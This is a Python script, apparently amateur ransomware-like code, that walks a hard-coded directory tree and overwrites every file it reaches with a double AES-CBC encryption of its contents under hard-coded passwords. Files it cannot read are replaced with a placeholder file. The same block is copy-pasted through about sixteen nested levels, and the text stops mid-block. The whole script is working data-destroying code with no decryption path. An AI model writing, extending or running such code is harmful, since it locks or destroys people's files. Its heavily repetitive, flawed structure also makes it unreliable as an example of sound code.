from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
from getpass import getpass
import shutil
import os
import zipfile
import tkinter as tk
import webbrowser


maincomponents_list = []
list1 = []
list2 = []
list3 = []
list4 = []
list5 = []
list6 = []
list7 = []
list8 = []
list9 = []
list10 = []
list11 = []
list12 = []
list13 = []
list14 = []
list15 = []
list16 = []
list17 = []
list18 = []
list19 = []
list20 = []
list21 = []
list22 = []
list23 = []
list24 = []
list25 = []
list26 = []
list27 = []
list28 = []
list29 = []
list30 = []


salt = b'\xd2\xed\xb5Hz\xa0\x87\xbfl\x16s\xfe\x94/\xc7I\xfe"\xb5\xbb\xafP\xc09\xe2\xc4\xc7\x0b\x97\xf0\x94\n'
Passw1 = "uguiyiyp87y8yhuhjbhjvyguiouoijhguguygyu9uugyuftiytciyckhvhj" #used >
Passw2 = "h5etryggkhj"
key1 = PBKDF2(Passw1, salt)
key2 = PBKDF2(Passw2, salt)
cipher1 = AES.new(key1, AES.MODE_CBC)
cipher2 = AES.new(key2, AES.MODE_CBC)

mainpath = "/Users/yallah/Desktop/mimic"
maincomponents = os.listdir(mainpath)
if "root" in maincomponents:
    maincomponents_list.append("root")
if "usr" in maincomponents:
    maincomponents_list.append("usr")
if "user" in maincomponents:
    maincomponents_list.append("user")

print("main components list is: ",maincomponents_list)

for component in maincomponents_list:
    print("main component we are on is: ", component)
    temp_mainpath = mainpath + "/" + component
    compnts = os.listdir(temp_mainpath)
    for comps in compnts:
        temppath = (str(temp_mainpath) + ("/" + comps))
        if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
            continue
        print("current path we are on is: ", temppath)

        try:
                with open(str(temppath), 'rb') as c:
                    contents = c.read()
                    #print(f"contents of tempath {temppath} is:",contents)
                #apply encryption
                encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))

                print("we encrypted the message of ", temppath,": ", encrypted_mess)

                doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                print("double encrypted outcome of message is: ", doubleencrypted_mess)


                if temppath[len(temppath)-3:len(temppath)] == "dmg":
                    with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                        f.write(doubleencrypted_mess)

                    dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                    with open(dmgpath, "wb") as g:
                        pass

                    shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                    shutil.move(dmgpath,temppath)
                                                
                else:
                    with open(str(temppath), "wb") as f:
                        f.write(doubleencrypted_mess)
                
            
        except:
               try: 
                    with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                        f.write("file used for overwriting purposes")

                    shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                    print("overwriting of path ", temppath , " was a success")


               except:
                    list1.append(temppath)
                    print("logging of path as a directory", temppath , " was a success")


    print("contents of list 1: ", list1)

    if len(list1) > 0:
        for directory_path in list1:
            components = os.listdir(directory_path)
            #age, hfhfh, hfhfhf
            for component in components:
                temppath = directory_path + '/' + component
                if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                  continue
                print("current path we are on is: ", temppath)


                try:
                    with open(str(temppath), 'rb') as c:
                        contents = c.read()
                        #print(f"contents of tempath {temppath} is:",contents)
                    #apply encryption
                    encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))

                    print("we encrypted the message of ", temppath,": ", encrypted_mess)

                    doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                    print("double encrypted outcome of message is: ", doubleencrypted_mess)

                    if temppath[len(temppath)-3:len(temppath)] == "dmg":
                            with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                f.write(doubleencrypted_mess)

                            dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                            with open(dmgpath, "wb") as g:
                                pass

                            shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                            shutil.move(dmgpath,temppath)
                                                
                    else:
                            with open(str(temppath), "wb") as f:
                                f.write(doubleencrypted_mess)
                
                
                except:
                    try: 
                            with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                f.write("file used for overwriting purposes")

                            shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                            print("overwriting of path ", temppath , " was a success")

                    except:
                        list2.append(temppath)
                        print("logging of path as a directory", temppath , " was a success")

                
            print('the contents of list 2 is:', list2)

        if len(list2) > 0:
                #/root/dogs/germanshep
                for directory_path in list2:
                    components = os.listdir(directory_path)
                    for component in components:
                        temppath = directory_path + '/' + component
                        if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                           continue

                        print("current path we are on is: ", temppath)

                        try:
                            with open(str(temppath), 'rb') as c:
                                contents = c.read()
                                #print(f"contents of tempath {temppath} is:",contents)
                            #apply encryption
                            encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                            print(encrypted_mess)

                            doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                            print("double encrypted outcome of message is: ", doubleencrypted_mess)

                            if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                    f.write(doubleencrypted_mess)

                                dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                with open(dmgpath, "wb") as g:
                                    pass

                                shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                shutil.move(dmgpath,temppath)
                                                
                            else:
                                with open(str(temppath), "wb") as f:
                                    f.write(doubleencrypted_mess)
                        
                        except:
                            try: 
                                    with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                        f.write("file used for overwriting purposes")

                                    shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                    print("overwriting of ", temppath, " was a success")

                            except:
                                    list3.append(temppath)
                                    print("appending of ", temppath, " to directory list was a success")
                      
                if len(list3) > 0:
                    #/root/dogs/germanshep
                    for directory_path in list3:
                        components = os.listdir(directory_path)
                        for component in components:
                            temppath = directory_path + '/' + component
                            if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                continue

                            print("current path we are on is: ", temppath)


                            try:
                                with open(str(temppath), 'rb') as c:
                                    contents = c.read()
                                    #print(f"contents of tempath {temppath} is:",contents)
                                #apply encryption
                                encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                print(encrypted_mess)

                                doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                        with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                            f.write(doubleencrypted_mess)

                                        dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                        with open(dmgpath, "wb") as g:
                                            pass

                                        shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                        shutil.move(dmgpath,temppath)
                                                
                                else:
                                            with open(str(temppath), "wb") as f:
                                                f.write(doubleencrypted_mess)
                            
                            except:
                                try: 
                                        with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                            f.write("file used for overwriting purposes")

                                        shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                        print("overwriting of ", temppath, " was a success")

                                except:
                                        list4.append(temppath)
                                        print("appending of ", temppath, " to directory list was a success")
                        

                    if len(list4) > 0:
                        #/root/dogs/germanshep
                        for directory_path in list4:
                            components = os.listdir(directory_path)
                            for component in components:
                                temppath = directory_path + '/' + component
                                if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                    continue

                                print("current path we are on is: ", temppath)


                                try:
                                    with open(str(temppath), 'rb') as c:
                                        contents = c.read()
                                        #print(f"contents of tempath {temppath} is:",contents)
                                    #apply encryption
                                    encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                    print(encrypted_mess)

                                    print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                    
                                    doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                    print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                    if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                            with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                f.write(doubleencrypted_mess)

                                            dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                            with open(dmgpath, "wb") as g:
                                                pass

                                            shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                            shutil.move(dmgpath,temppath)
                                                
                                    else:
                                            with open(str(temppath), "wb") as f:
                                                f.write(doubleencrypted_mess)

                                
                                except:
                                    try: 
                                            with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                f.write("file used for overwriting purposes")

                                            shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                            print("overwriting of ", temppath, " was a success")

                                    except:
                                            list5.append(temppath)
                                            print("appending of ", temppath, " to directory list was a success")
                        
                        if len(list5) > 0:
                        #/root/dogs/germanshep
                            for directory_path in list5:
                                components = os.listdir(directory_path)
                                for component in components:
                                    temppath = directory_path + '/' + component
                                    if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                        continue

                                    print("current path we are on is: ", temppath)


                                    try:
                                        with open(str(temppath), 'rb') as c:
                                            contents = c.read()
                                            #print(f"contents of tempath {temppath} is:",contents)
                                        #apply encryption
                                        encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                        print(encrypted_mess)

                                        print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                        
                                        doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                        print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                        if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                            with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                f.write(doubleencrypted_mess)

                                            dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                            with open(dmgpath, "wb") as g:
                                                pass

                                            shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                            shutil.move(dmgpath,temppath)
                                                
                                        else:
                                            with open(str(temppath), "wb") as f:
                                                f.write(doubleencrypted_mess)
                                    
                                    
                                    except:
                                        try: 
                                                with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                    f.write("file used for overwriting purposes")

                                                shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                print("overwriting of ", temppath, " was a success")

                                        except:
                                                list6.append(temppath)
                                                print("appending of ", temppath, " to directory list was a success")

                            if len(list6) > 0:
                        #/root/dogs/germanshep
                                for directory_path in list6:
                                    components = os.listdir(directory_path)
                                    for component in components:
                                        temppath = directory_path + '/' + component
                                        if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                            continue

                                        print("current path we are on is: ", temppath)


                                        try:
                                            with open(str(temppath), 'rb') as c:
                                                contents = c.read()
                                                #print(f"contents of tempath {temppath} is:",contents)
                                            #apply encryption
                                            encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                            print(encrypted_mess)

                                            print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                            
                                            doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                            print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                            if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                    f.write(doubleencrypted_mess)

                                                dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                with open(dmgpath, "wb") as g:
                                                    pass

                                                shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                shutil.move(dmgpath,temppath)
                                                    
                                            else:
                                                with open(str(temppath), "wb") as f:
                                                    f.write(doubleencrypted_mess)
                                        
                                        
                                        except:
                                            try: 
                                                    with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                        f.write("file used for overwriting purposes")

                                                    shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                    print("overwriting of ", temppath, " was a success")

                                            except:
                                                    list7.append(temppath)
                                                    print("appending of ", temppath, " to directory list was a success")


                                if len(list7) > 0:
                                    #/root/dogs/germanshep
                                    for directory_path in list7:
                                        components = os.listdir(directory_path)
                                        for component in components:
                                            temppath = directory_path + '/' + component
                                            if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                continue

                                            print("current path we are on is: ", temppath)


                                            try:
                                                with open(str(temppath), 'rb') as c:
                                                    contents = c.read()
                                                    #print(f"contents of tempath {temppath} is:",contents)
                                                #apply encryption
                                                encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                print(encrypted_mess)

                                                print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                
                                                doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                    with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                        f.write(doubleencrypted_mess)

                                                    dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                    with open(dmgpath, "wb") as g:
                                                        pass

                                                    shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                    shutil.move(dmgpath,temppath)
                                                        
                                                else:
                                                    with open(str(temppath), "wb") as f:
                                                        f.write(doubleencrypted_mess)
                                            
                                            
                                            except:
                                                try: 
                                                        with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                            f.write("file used for overwriting purposes")

                                                        shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                        print("overwriting of ", temppath, " was a success")

                                                except:
                                                        list8.append(temppath)
                                                        print("appending of ", temppath, " to directory list was a success")

                                    if len(list8) > 0:
                                        #/root/dogs/germanshep
                                        for directory_path in list8:
                                            components = os.listdir(directory_path)
                                            for component in components:
                                                temppath = directory_path + '/' + component
                                                if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                    continue

                                                print("current path we are on is: ", temppath)


                                                try:
                                                    with open(str(temppath), 'rb') as c:
                                                        contents = c.read()
                                                        #print(f"contents of tempath {temppath} is:",contents)
                                                    #apply encryption
                                                    encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                    print(encrypted_mess)

                                                    print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                    
                                                    doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                    print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                    if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                        with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                            f.write(doubleencrypted_mess)

                                                        dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                        with open(dmgpath, "wb") as g:
                                                            pass

                                                        shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                        shutil.move(dmgpath,temppath)
                                                            
                                                    else:
                                                        with open(str(temppath), "wb") as f:
                                                            f.write(doubleencrypted_mess)
                                                
                                                
                                                except:
                                                    try: 
                                                            with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                f.write("file used for overwriting purposes")

                                                            shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                            print("overwriting of ", temppath, " was a success")

                                                    except:
                                                            list9.append(temppath)
                                                            print("appending of ", temppath, " to directory list was a success")



                                        if len(list9) > 0:
                                            #/root/dogs/germanshep
                                            for directory_path in list9:
                                                components = os.listdir(directory_path)
                                                for component in components:
                                                    temppath = directory_path + '/' + component
                                                    if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                        continue

                                                    print("current path we are on is: ", temppath)


                                                    try:
                                                        with open(str(temppath), 'rb') as c:
                                                            contents = c.read()
                                                            #print(f"contents of tempath {temppath} is:",contents)
                                                        #apply encryption
                                                        encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                        print(encrypted_mess)

                                                        print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                        
                                                        doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                        print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                        if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                            with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                f.write(doubleencrypted_mess)

                                                            dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                            with open(dmgpath, "wb") as g:
                                                                pass

                                                            shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                            shutil.move(dmgpath,temppath)
                                                                
                                                        else:
                                                            with open(str(temppath), "wb") as f:
                                                                f.write(doubleencrypted_mess)
                                                    
                                                    
                                                    except:
                                                        try: 
                                                                with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                    f.write("file used for overwriting purposes")

                                                                shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                print("overwriting of ", temppath, " was a success")

                                                        except:
                                                                list10.append(temppath)
                                                                print("appending of ", temppath, " to directory list was a success")



                                            if len(list10) > 0:
                                                #/root/dogs/germanshep
                                                for directory_path in list10:
                                                    components = os.listdir(directory_path)
                                                    for component in components:
                                                        temppath = directory_path + '/' + component
                                                        if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                            continue

                                                        print("current path we are on is: ", temppath)


                                                        try:
                                                            with open(str(temppath), 'rb') as c:
                                                                contents = c.read()
                                                                #print(f"contents of tempath {temppath} is:",contents)
                                                            #apply encryption
                                                            encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                            print(encrypted_mess)

                                                            print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                            
                                                            doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                            print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                            if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                    f.write(doubleencrypted_mess)

                                                                dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                with open(dmgpath, "wb") as g:
                                                                    pass

                                                                shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                shutil.move(dmgpath,temppath)
                                                                    
                                                            else:
                                                                with open(str(temppath), "wb") as f:
                                                                    f.write(doubleencrypted_mess)
                                                        
                                                        
                                                        except:
                                                            try: 
                                                                    with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                        f.write("file used for overwriting purposes")

                                                                    shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                    print("overwriting of ", temppath, " was a success")

                                                            except:
                                                                    list11.append(temppath)
                                                                    print("appending of ", temppath, " to directory list was a success")


                                                if len(list11) > 0:
                                                    #/root/dogs/germanshep
                                                    for directory_path in list11:
                                                        components = os.listdir(directory_path)
                                                        for component in components:
                                                            temppath = directory_path + '/' + component
                                                            if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                continue

                                                            print("current path we are on is: ", temppath)


                                                            try:
                                                                with open(str(temppath), 'rb') as c:
                                                                    contents = c.read()
                                                                    #print(f"contents of tempath {temppath} is:",contents)
                                                                #apply encryption
                                                                encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                print(encrypted_mess)

                                                                print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                
                                                                doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                    with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                        f.write(doubleencrypted_mess)

                                                                    dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                    with open(dmgpath, "wb") as g:
                                                                        pass

                                                                    shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                    shutil.move(dmgpath,temppath)
                                                                        
                                                                else:
                                                                    with open(str(temppath), "wb") as f:
                                                                        f.write(doubleencrypted_mess)
                                                            
                                                            
                                                            except:
                                                                try: 
                                                                        with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                            f.write("file used for overwriting purposes")

                                                                        shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                        print("overwriting of ", temppath, " was a success")

                                                                except:
                                                                        list12.append(temppath)
                                                                        print("appending of ", temppath, " to directory list was a success")
                                                    
                                                    if len(list12) > 0:
                                                        #/root/dogs/germanshep
                                                        for directory_path in list12:
                                                            components = os.listdir(directory_path)
                                                            for component in components:
                                                                temppath = directory_path + '/' + component
                                                                if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                    continue

                                                                print("current path we are on is: ", temppath)


                                                                try:
                                                                    with open(str(temppath), 'rb') as c:
                                                                        contents = c.read()
                                                                        #print(f"contents of tempath {temppath} is:",contents)
                                                                    #apply encryption
                                                                    encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                    print(encrypted_mess)

                                                                    print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                    
                                                                    doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                    print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                    if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                        with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                            f.write(doubleencrypted_mess)

                                                                        dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                        with open(dmgpath, "wb") as g:
                                                                            pass

                                                                        shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                        shutil.move(dmgpath,temppath)
                                                                            
                                                                    else:
                                                                        with open(str(temppath), "wb") as f:
                                                                            f.write(doubleencrypted_mess)
                                                                
                                                                
                                                                except:
                                                                    try: 
                                                                            with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                f.write("file used for overwriting purposes")

                                                                            shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                            print("overwriting of ", temppath, " was a success")

                                                                    except:
                                                                            list13.append(temppath)
                                                                            print("appending of ", temppath, " to directory list was a success")


                                                        if len(list13) > 0:
                                                            #/root/dogs/germanshep
                                                            for directory_path in list13:
                                                                components = os.listdir(directory_path)
                                                                for component in components:
                                                                    temppath = directory_path + '/' + component
                                                                    if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                        continue

                                                                    print("current path we are on is: ", temppath)


                                                                    try:
                                                                        with open(str(temppath), 'rb') as c:
                                                                            contents = c.read()
                                                                            #print(f"contents of tempath {temppath} is:",contents)
                                                                        #apply encryption
                                                                        encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                        print(encrypted_mess)

                                                                        print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                        
                                                                        doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                        print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                        if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                            with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                f.write(doubleencrypted_mess)

                                                                            dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                            with open(dmgpath, "wb") as g:
                                                                                pass

                                                                            shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                            shutil.move(dmgpath,temppath)
                                                                                
                                                                        else:
                                                                            with open(str(temppath), "wb") as f:
                                                                                f.write(doubleencrypted_mess)
                                                                    
                                                                    
                                                                    except:
                                                                        try: 
                                                                                with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                    f.write("file used for overwriting purposes")

                                                                                shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                print("overwriting of ", temppath, " was a success")

                                                                        except:
                                                                                list14.append(temppath)
                                                                                print("appending of ", temppath, " to directory list was a success")

                                                            
                                                            if len(list14) > 0:
                                                                #/root/dogs/germanshep
                                                                for directory_path in list14:
                                                                    components = os.listdir(directory_path)
                                                                    for component in components:
                                                                        temppath = directory_path + '/' + component
                                                                        if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                            continue

                                                                        print("current path we are on is: ", temppath)


                                                                        try:
                                                                            with open(str(temppath), 'rb') as c:
                                                                                contents = c.read()
                                                                                #print(f"contents of tempath {temppath} is:",contents)
                                                                            #apply encryption
                                                                            encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                            print(encrypted_mess)

                                                                            print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                            
                                                                            doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                            print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                            if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                    f.write(doubleencrypted_mess)

                                                                                dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                with open(dmgpath, "wb") as g:
                                                                                    pass

                                                                                shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                shutil.move(dmgpath,temppath)
                                                                                    
                                                                            else:
                                                                                with open(str(temppath), "wb") as f:
                                                                                    f.write(doubleencrypted_mess)
                                                                        
                                                                        
                                                                        except:
                                                                            try: 
                                                                                    with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                        f.write("file used for overwriting purposes")

                                                                                    shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                    print("overwriting of ", temppath, " was a success")

                                                                            except:
                                                                                    list15.append(temppath)
                                                                                    print("appending of ", temppath, " to directory list was a success")


                                                                if len(list15) > 0:
                                                                    #/root/dogs/germanshep
                                                                    for directory_path in list15:
                                                                        components = os.listdir(directory_path)
                                                                        for component in components:
                                                                            temppath = directory_path + '/' + component
                                                                            if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                                continue

                                                                            print("current path we are on is: ", temppath)


                                                                            try:
                                                                                with open(str(temppath), 'rb') as c:
                                                                                    contents = c.read()
                                                                                    #print(f"contents of tempath {temppath} is:",contents)
                                                                                #apply encryption
                                                                                encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                                print(encrypted_mess)

                                                                                print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                                
                                                                                doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                                print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                                if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                    with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                        f.write(doubleencrypted_mess)

                                                                                    dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                    with open(dmgpath, "wb") as g:
                                                                                        pass

                                                                                    shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                    shutil.move(dmgpath,temppath)
                                                                                        
                                                                                else:
                                                                                    with open(str(temppath), "wb") as f:
                                                                                        f.write(doubleencrypted_mess)
                                                                            
                                                                            
                                                                            except:
                                                                                try: 
                                                                                        with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                            f.write("file used for overwriting purposes")

                                                                                        shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                        print("overwriting of ", temppath, " was a success")

                                                                                except:
                                                                                        list16.append(temppath)
                                                                                        print("appending of ", temppath, " to directory list was a success")

                                                                    

                                                                    if len(list16) > 0:
                                                                        #/root/dogs/germanshep
                                                                        for directory_path in list16:
                                                                            components = os.listdir(directory_path)
                                                                            for component in components:
                                                                                temppath = directory_path + '/' + component
                                                                                if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                                    continue

                                                                                print("current path we are on is: ", temppath)


                                                                                try:
                                                                                    with open(str(temppath), 'rb') as c:
                                                                                        contents = c.read()
                                                                                        #print(f"contents of tempath {temppath} is:",contents)
                                                                                    #apply encryption
                                                                                    encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                                    print(encrypted_mess)

                                                                                    print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                                    
                                                                                    doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                                    print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                                    if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                        with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                            f.write(doubleencrypted_mess)

                                                                                        dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                        with open(dmgpath, "wb") as g:
                                                                                            pass

                                                                                        shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                        shutil.move(dmgpath,temppath)
                                                                                            
                                                                                    else:
                                                                                        with open(str(temppath), "wb") as f:
                                                                                            f.write(doubleencrypted_mess)
                                                                                
                                                                                
                                                                                except:
                                                                                    try: 
                                                                                            with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
